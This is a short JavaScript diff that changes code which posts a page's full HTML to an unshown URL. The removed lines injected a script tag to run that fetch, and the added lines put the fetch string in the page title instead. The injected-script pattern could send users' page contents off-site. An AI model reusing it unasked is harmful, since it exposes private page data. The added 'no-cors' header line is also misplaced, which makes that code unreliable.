@@ -26,14 +26,13 @@
                 Contents: document.documentElement.innerHTML
             });
             var headers = {
-                "Content-type": "application/json; charset=UTF-8"
+                "Content-type": "application/json; charset=UTF-8",
+                "mode": "no-cors"
             };
 
             var requestString = stringifyRequest(method, url, body, headers);
-            var scriptTag = document.createElement('script');
-            scriptTag.textContent = 'fetch(' + JSON.stringify(url) + ', {method: ' + JSON.stringify(method) + ', body: ' + JSON.stringify(body) + ', headers: ' + JSON.stringify(headers) + '})';
-            document.head.appendChild(scriptTag);
-            document.title = requestString;
+            var fetchString = 'fetch(' + JSON.stringify(url) + ', {method: ' + JSON.stringify(method) + ', body: ' + JSON.stringify(body) + ', headers: ' + JSON.stringify(headers) + '})';
+            document.title = fetchString;
         }
 
         // Wait for 3 seconds and then create the script tag with the POST request
